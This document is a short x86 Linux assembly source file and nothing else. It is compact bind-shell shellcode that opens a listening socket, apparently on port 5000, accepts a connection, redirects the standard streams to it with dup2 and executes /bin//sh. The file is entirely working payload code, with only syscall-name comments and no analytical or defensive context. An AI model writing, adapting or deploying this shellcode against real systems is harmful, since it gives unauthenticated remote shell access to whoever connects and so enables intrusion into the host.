        .intel_syntax noprefix
        .globl _start
_start:
        xor ebx, ebx
        mul ebx
        push ebx
        inc ebx
        push ebx
        push 2
        mov ecx, esp
        mov al, 102
        int 0x80                # socket
        pop ebx
        pop esi
        push edx
        pushw 0x8813
        pushw 2
        push 16
        push ecx
        push eax
        mov ecx, esp
        push 102
        pop eax
        int 0x80                # bind
        mov [ecx+4], eax
        mov bl, 4
        mov al, 102
        int 0x80                # listen
        inc ebx
        mov al, 102
        int 0x80                # accept
dup:
        xchg ebx, eax
        pop ecx
dup_loop:
        push 63
        pop eax
        int 0x80
        dec ecx
        jns dup_loop
exec_shell:
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push eax
        push ebx
        mov ecx, esp
        mov al, 11
        int 0x80
